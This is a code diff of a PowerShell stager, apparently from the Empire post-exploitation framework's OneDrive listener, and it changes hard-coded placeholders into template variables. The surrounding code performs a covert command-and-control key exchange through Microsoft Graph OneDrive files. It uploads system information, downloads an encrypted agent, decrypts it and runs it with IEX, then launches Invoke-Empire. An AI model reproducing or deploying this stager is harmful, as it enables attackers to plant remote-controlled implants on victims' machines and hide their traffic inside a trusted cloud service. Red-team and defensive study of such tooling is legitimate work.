@@ -121,20 +121,23 @@ function Start-Negotiate {
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
     $wc.Headers.Set("Content-Type", "application/octet-stream");
+
+    $StagingFolder = "{{ base_folder }}/{{ staging_folder }}";
+
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
-    $Null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_1.txt:/content", "put", $rc4p);
+    $Null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$StagingFolder/$($ID)_1.txt:/content", "put", $rc4p);
 
     # step 4 of negotiation -> server returns RSA(nonce+AESsession))
     Start-Sleep -Seconds $(($PI -as [Int])*2);
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
     Do{try{
-    $raw=$wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_2.txt:/content");
+    $raw=$wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$StagingFolder/$($ID)_2.txt:/content");
     }catch{Start-Sleep -Seconds $(($PI -as [Int])*2)}}While($raw -eq $null);
 
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
-    $null=$wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_2.txt", "DELETE", "");
+    $null=$wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$StagingFolder/$($ID)_2.txt", "DELETE", "");
 
     $de=$e.GetString($rs.decrypt($raw,$false));
     # packet = server nonce + AES session key
@@ -197,14 +200,14 @@ function Start-Negotiate {
     $wc.Headers.Set("Content-Type", "application/octet-stream");
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
-    $Null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_3.txt:/content", "PUT", $rc4p2);
+    $Null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$StagingFolder/$($ID)_3.txt:/content", "PUT", $rc4p2);
 
     Start-Sleep -Seconds $(($PI -as [Int])*2);
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
     $raw=$null;
     do{try{
-    $raw=$wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_4.txt:/content");
+    $raw=$wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$StagingFolder/$($ID)_4.txt:/content");
     }catch{Start-Sleep -Seconds $(($PI -as [Int])*2)}}While($raw -eq $null);
 
     Start-Sleep -Seconds $($PI -as [Int]);
@@ -218,7 +221,7 @@ function Start-Negotiate {
     $wc2.Headers.Add("User-Agent",$UA);
     $wc2.Headers.Add("Authorization", "Bearer $T");
     $wc2.Headers.Add("Content-Type", " application/json");
-    $Null=$wc2.UploadString("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_4.txt", "DELETE", "");
+    $Null=$wc2.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$StagingFolder/$($ID)_4.txt", "DELETE", "");
 
     # decrypt the agent and register the agent logic
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
@@ -228,7 +231,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "REPLACE_WORKING_HOURS" -ProxySettings $Script:Proxy;
+    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -T "REPLACE_TOKEN" -PI "REPLACE_POLLING_INTERVAL" -SK "REPLACE_STAGING_KEY" -UA $u;
+Start-Negotiate -T "{{ token }}" -PI "{{ poll_interval }}" -SK "{{ staging_key }}" -UA $u;
